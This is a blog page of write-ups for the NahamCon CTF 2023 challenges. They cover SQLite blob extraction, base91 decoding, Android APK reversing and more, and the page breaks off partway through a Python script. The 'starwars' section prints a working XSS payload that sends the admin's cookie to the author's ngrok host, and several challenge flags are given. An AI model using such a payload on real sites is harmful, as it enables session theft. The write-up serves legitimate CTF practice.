<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
I opened the file using sqlite database browser
browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
we can use this sql statement to get the blob'>
<title>Nahamcon2023</title>

<link rel='canonical' href='https://f0rk3b0mb.github.io/p/nahamcon2023/'>

<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Nahamcon2023'>
<meta property='og:description' content='Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
I opened the file using sqlite database browser
browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
we can use this sql statement to get the blob'>
<meta property='og:url' content='https://f0rk3b0mb.github.io/p/nahamcon2023/'>
<meta property='og:site_name' content='f0rk3b0mb'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-06-15T20:58:33&#43;03:00'/><meta property='article:modified_time' content='2023-06-15T20:58:33&#43;03:00'/>
<meta name="twitter:site" content="@f0rk3b0mb">
    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Nahamcon2023">
<meta name="twitter:description" content="Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
I opened the file using sqlite database browser
browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
we can use this sql statement to get the blob">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-45FL0WGH80', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/profile_huf077503059140d44e06db4f515bdfac7_70175_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ðŸ˜Ž</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">f0rk3b0mb</a></h1>
            <h2 class="site-description">Ctf player p3rf3ctr00t_ke | Cybersecurity | Infosec | red_teamer | web_security_analyst</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://discordapp.com/users/888054460956422195'
                        target="_blank"
                        title="discord"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" encoding="UTF-8"?>
<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg width="800px" height="800px" viewBox="0 -28.5 256 256" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">
    <g>
        <path d="M216.856339,16.5966031 C200.285002,8.84328665 182.566144,3.2084988 164.041564,0 C161.766523,4.11318106 159.108624,9.64549908 157.276099,14.0464379 C137.583995,11.0849896 118.072967,11.0849896 98.7430163,14.0464379 C96.9108417,9.64549908 94.1925838,4.11318106 91.8971895,0 C73.3526068,3.2084988 55.6133949,8.86399117 39.0420583,16.6376612 C5.61752293,67.146514 -3.4433191,116.400813 1.08711069,164.955721 C23.2560196,181.510915 44.7403634,191.567697 65.8621325,198.148576 C71.0772151,190.971126 75.7283628,183.341335 79.7352139,175.300261 C72.104019,172.400575 64.7949724,168.822202 57.8887866,164.667963 C59.7209612,163.310589 61.5131304,161.891452 63.2445898,160.431257 C105.36741,180.133187 151.134928,180.133187 192.754523,160.431257 C194.506336,161.891452 196.298154,163.310589 198.110326,164.667963 C191.183787,168.842556 183.854737,172.420929 176.223542,175.320965 C180.230393,183.341335 184.861538,190.991831 190.096624,198.16893 C211.238746,191.588051 232.743023,181.531619 254.911949,164.955721 C260.227747,108.668201 245.831087,59.8662432 216.856339,16.5966031 Z M85.4738752,135.09489 C72.8290281,135.09489 62.4592217,123.290155 62.4592217,108.914901 C62.4592217,94.5396472 72.607595,82.7145587 85.4738752,82.7145587 C98.3405064,82.7145587 108.709962,94.5189427 108.488529,108.914901 C108.508531,123.290155 98.3405064,135.09489 85.4738752,135.09489 Z M170.525237,135.09489 C157.88039,135.09489 147.510584,123.290155 147.510584,108.914901 C147.510584,94.5396472 157.658606,82.7145587 170.525237,82.7145587 C183.391518,82.7145587 193.761324,94.5189427 193.539891,108.914901 C193.539891,123.290155 183.391518,135.09489 170.525237,135.09489 Z" fill="#5865F2" fill-rule="nonzero">
</path>
    </g>
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/f0rk3b0mb'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ke.linkedin.com/in/abel-biketi-261212257'
                        target="_blank"
                        title="linkedin"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg width="800px" height="800px" viewBox="0 -2 44 44" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>LinkedIn-color</title>
    <desc>Created with Sketch.</desc>
    <defs>

</defs>
    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Color-" transform="translate(-702.000000, -265.000000)" fill="#007EBB">
            <path d="M746,305 L736.2754,305 L736.2754,290.9384 C736.2754,287.257796 734.754233,284.74515 731.409219,284.74515 C728.850659,284.74515 727.427799,286.440738 726.765522,288.074854 C726.517168,288.661395 726.555974,289.478453 726.555974,290.295511 L726.555974,305 L716.921919,305 C716.921919,305 717.046096,280.091247 716.921919,277.827047 L726.555974,277.827047 L726.555974,282.091631 C727.125118,280.226996 730.203669,277.565794 735.116416,277.565794 C741.21143,277.565794 746,281.474355 746,289.890824 L746,305 L746,305 Z M707.17921,274.428187 L707.117121,274.428187 C704.0127,274.428187 702,272.350964 702,269.717936 C702,267.033681 704.072201,265 707.238711,265 C710.402634,265 712.348071,267.028559 712.41016,269.710252 C712.41016,272.34328 710.402634,274.428187 707.17921,274.428187 L707.17921,274.428187 L707.17921,274.428187 Z M703.109831,277.827047 L711.685795,277.827047 L711.685795,305 L703.109831,305 L703.109831,277.827047 L703.109831,277.827047 Z" id="LinkedIn">

</path>
        </g>
    </g>
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/f0rk3b0mb'
                        target="_blank"
                        title="twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/posts' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="5" cy="19" r="1" />
  <path d="M4 4a16 16 0 0 1 16 16" />
  <path d="M4 11a9 9 0 0 1 9 9" />
</svg>



                
                <span>posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about' target="_blank">
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>about</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li>
          <ol>
            <li><a href="#nahamcon-ctf-2023-writeups">Nahamcon CTF 2023 writeups</a></li>
          </ol>
        </li>
        <li><a href="#warmups">warmups</a></li>
        <li><a href="#blobber">blobber</a></li>
        <li><a href="#ninety-one">ninety one</a></li>
        <li><a href="#glasses">glasses</a></li>
        <li><a href="#web-category">web category</a></li>
        <li><a href="#starwars">starwars</a></li>
        <li><a href="#misc-category">misc category</a></li>
        <li><a href="#zombies">zombies</a></li>
        <li><a href="#mobile-category">mobile category</a></li>
        <li><a href="#jninjaspeak">jninjaspeak</a></li>
        <li><a href="#fortune-teller">Fortune teller</a></li>
        <li><a href="#wheres-waldo">wheres waldo</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeups/" style="background-color: #2a9d8f; color: #fff;">
                ctf writeups
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/nahamcon2023/">Nahamcon2023</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jun 15, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    6 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h4 id="nahamcon-ctf-2023-writeups">Nahamcon CTF 2023 writeups</h4>
<h3 id="warmups">warmups</h3>
<hr>
<h3 id="blobber">blobber</h3>
<p>Thic challenge had a downloadable part , the file was a sqlite database.</p>
<p>I opened the file using sqlite database browser</p>
<p><img src="/images/nahamcon2023/sqlite.png"
	
	
	
	loading="lazy"
	
		alt="sqlite"
	
	
></p>
<p>browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as  entries. Read more <a class="link" href="https://rogerbinns.github.io/apsw/blob.html"  target="_blank" rel="noopener"
    >here</a></p>
<p>we can use this sql statement to get the blob</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
<span class="k">select</span> data from blobber where <span class="nv">id</span><span class="o">=</span><span class="m">238</span>

</code></pre></td></tr></table>
</div>
</div><p>Then save it to a file ,  the resulting file in is a bzip2 archive, extracting , you get an image of the flag</p>
<p><img src="/images/nahamcon2023/blobber_extract.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h3 id="ninety-one">ninety one</h3>
<p>In this challenge you are provided with an encoded string</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">@iH&lt;,<span class="o">{</span><span class="p">|</span>jbRH?L^VjGJH&lt;vn3p7I,x~@1jyt&gt;x?,!YAJr*08P
</code></pre></td></tr></table>
</div>
</div><p>I used this tool &raquo; <a class="link" href="https://www.dcode.fr/base-91-encoding"  target="_blank" rel="noopener"
    >here</a> to analyse and decode it , it was encrypted using base91 encoding</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
flag<span class="o">{</span>dfb88c7d9ca38e71dc27e1072fc43d1b<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="glasses">glasses</h3>
<hr>
<p>This challenge you were provided with a webpage. It had no functionality, based on the title of the challenge it is obvious that we nee to find something hidden.</p>
<p>Lokking through the source I found  obfuscated js code. You can use this tool &raquo; <a class="link" href="https://lelinhtinh.github.io/de4js/"  target="_blank" rel="noopener"
    >here</a> to deobfuscate it . It returns  html code the with the flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
flag<span class="o">{</span>8084e4530cf649814456f2a291eb81e9<span class="o">}</span>

</code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="web-category">web category</h3>
<hr>
<h3 id="starwars">starwars</h3>
<hr>
<p>In this challenge you are provided with a web endpoint that allows you to signup and login The goal is to login as admin , you can also comment and the admin reviews your comment , obvoiusly it is classic xxs</p>
<p><img src="/images/nahamcon2023/alert.png"
	
	
	
	loading="lazy"
	
		alt="xss"
	
	
></p>
<p>this below is the payload i used . it fetches my ngrok endpoint with the cookie appanded at the end. I dont know if the first part was necessary , I   generated it by trial and error and it worked</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
<span class="s2">&#34;&gt;&lt;script&gt;
</span><span class="s2">var iframe = document.body.appendChild(document.createElement(&#39;iframe&#39;));
</span><span class="s2">iframe.style.cssText = &#39;height: 500px; width: 100%&#39;;
</span><span class="s2">iframe.src = &#39;http://challenge.nahamcon.com:30467/signup&#39;;
</span><span class="s2">iframe.onload = function() { fetch(&#39;http://f910-102-167-145-177.ngrok-free.app?iframeContents=&#39; + btoa(window.document.cookie), { method: &#39;GET&#39; }).then(response =&gt; response.json()).then(data =&gt; console.log(data)).catch(error =&gt; console.error(error)); };&lt;/script&gt;
</span><span class="s2">
</span></code></pre></td></tr></table>
</div>
</div><p>the flag will be returned in base64 format. Use it in the browser to access /admin page and the flag</p>
<p><img src="/images/nahamcon2023/base64.png"
	
	
	
	loading="lazy"
	
		alt="base64"
	
	
></p>
<p><img src="/images/nahamcon2023/sflag.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h3 id="misc-category">misc category</h3>
<hr>
<h3 id="zombies">zombies</h3>
<hr>
<p>In this challenge you were provided with an ssh endpoint to connect to</p>
<p>reading the file .user-entrypoint.sh</p>
<p><img src="/images/nahamcon2023/nohup.png"
	
	
	
	loading="lazy"
	
		alt="file"
	
	
></p>
<p>nohup is  enables a program to run even after a terminal window is closed , if you check running processes you can see that tail is still running.
Running processes usually have the activities stored in /proc directory. in the image below 11 is the pid of the tail process</p>
<p><img src="/images/nahamcon2023/tail.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<h3 id="mobile-category">mobile category</h3>
<hr>
<p>This challenge requires a set of  tools to be able to do anything :</p>
<p><a class="link" href="https://github.com/pxb1988/dex2jar"  target="_blank" rel="noopener"
    >dex2jar</a></p>
<p><a class="link" href="http://java-decompiler.github.io/"  target="_blank" rel="noopener"
    >jdgui</a></p>
<p><a class="link" href="https://ghidra-sre.org/"  target="_blank" rel="noopener"
    >ghidra</a></p>
<p><a class="link" href="https://www.genymotion.com/"  target="_blank" rel="noopener"
    >genymotion</a>  &laquo;  android emulator on pc</p>
<p><a class="link" href="https://developer.android.com/tools/adb"  target="_blank" rel="noopener"
    >adb</a></p>
<p><a class="link" href="https://ibotpeaches.github.io/Apktool/"  target="_blank" rel="noopener"
    >apktools</a></p>
<h3 id="jninjaspeak">jninjaspeak</h3>
<hr>
<p>In this challnge you are provided with an apk file , you can install it on genymotion using adb, it is a simple prompt that  converts input to jninjaspeak.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">adb install jninjaspeak.apk

</code></pre></td></tr></table>
</div>
</div><p>Decompile the application using apktool</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
use :   apktool -r -s d   jninjaspeak.apk


</code></pre></td></tr></table>
</div>
</div><p>We use -r -s flags to tell apktool not to decompile the dexfiles to smali which it does by default.</p>
<p>Convert the dex files to jar using dex2jar to be able to view the source using jdgui.</p>
<p>In the mainactivity we see that the program needs libjninjaspeak.so  liblary that is used to translate the input.</p>
<p>Here we use ghidra to reverse engineer the liblary , the liblary is in the /lib in the folder apktool generated.</p>
<p>In ghidra , in the main function of the liblary we find the flag</p>
<p><img src="/images/nahamcon2023/jninja.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<p>flag{1f539e4a706e6181dae9db3fad6a78f1}</p>
<hr>
<h3 id="fortune-teller">Fortune teller</h3>
<hr>
<p>For this challenge follow the above steps  to install and decompile the application and convers dex files to jar.</p>
<p>The mainactivity function in located the classes3.dex. Looking closely you can see that the application uses our input as a key to decrypt an encrypted file , the encryption used is AES.</p>
<p>The file is decrypted in the decrypt.class. Where our input is used in the SecretKeySpec
object.</p>
<p>Based on my simple java programming undertanding :)  there is a variable called correctString that is initialized in the main function.</p>
<p><img src="/images/nahamcon2023/correct.png"
	
	
	
	loading="lazy"
	
		alt="correct"
	
	
></p>
<p>It is followed by its getter function</p>
<p><img src="/images/nahamcon2023/getter.png"
	
	
	
	loading="lazy"
	
		alt="getter"
	
	
></p>
<p>and then tracing it we find the  setter function</p>
<p><img src="/images/nahamcon2023/setter.png"
	
	
	
	loading="lazy"
	
		alt="setter"
	
	
></p>
<p>It sets correctString to the value by resource id 2131755048 . Resource ids can be traced what that point to in the classes2.dex, path is shown below</p>
<p><img src="/images/nahamcon2023/ridpath.png"
	
	
	
	loading="lazy"
	
		alt="ridpath"
	
	
></p>
<p><img src="/images/nahamcon2023/rid.png"
	
	
	
	loading="lazy"
	
		alt="rid"
	
	
></p>
<p>It is point to a string , the resorces can be found the /res folder since the value is a string we goto /res/values  and cat strings.xml.</p>
<p><img src="/images/nahamcon2023/strings.png"
	
	
	
	loading="lazy"
	
		alt="strings"
	
	
></p>
<p>The key is &ldquo;you won this ctf&rdquo; , enter it and get the flag</p>
<p><img src="/images/nahamcon2023/teller_flag.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h3 id="wheres-waldo">wheres waldo</h3>
<hr>
<p>In this challenge you are provided with an apk file , follow the steps above to decompile it and open the sources in jd gui and install it in the emulator.</p>
<p>This application is some type of maps applcation so the objective is to find the location of waldo in the map.</p>
<p>Analysing the mainactivity function you can see thet the application is making a request to an endpoint which determines id we have found waldo and the distance from him</p>
<p><img src="/images/nahamcon2023/waldo.png"
	
	
	
	loading="lazy"
	
		alt="waldo"
	
	
></p>
<p>The objective is to set longitude and latitude that results on the off_by value to result to zero as you can see below</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java">
<span class="n">mapView1</span><span class="o">.</span><span class="na">getController</span><span class="o">().</span><span class="na">setCenter</span><span class="o">((</span><span class="n">IGeoPoint</span><span class="o">)</span><span class="k">new</span> <span class="n">GeoPoint</span><span class="o">(</span><span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">(),</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">()));</span>
          <span class="n">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">()).</span><span class="na">url</span><span class="o">(</span><span class="s">&#34;http://challenge.nahamcon.com:30001/location?lat=&#34;</span> <span class="o">+</span> <span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;&amp;long=&#34;</span> <span class="o">+</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">()).</span><span class="na">build</span><span class="o">();</span>
          <span class="n">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">OkHttpClient</span><span class="o">()).</span><span class="na">newCall</span><span class="o">(</span><span class="n">request</span><span class="o">).</span><span class="na">execute</span><span class="o">();</span>

</code></pre></td></tr></table>
</div>
</div><p>the code above takes the off_by and calculates the distance from waldo by miles.</p>
<p>I scripted this  python program to do all the hardwork (at least).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">calculate_distance</span><span class="p">(</span><span class="n">latitude</span><span class="p">,</span> <span class="n">longitude</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://challenge.nahamcon.com:30001/location?lat=</span><span class="si">{</span><span class="n">latitude</span><span class="si">}</span><span class="s1">&amp;long=</span><span class="si">{</span><span class="n">longitude</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>  <span class="c1"># Replace with the actual API endpoint</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
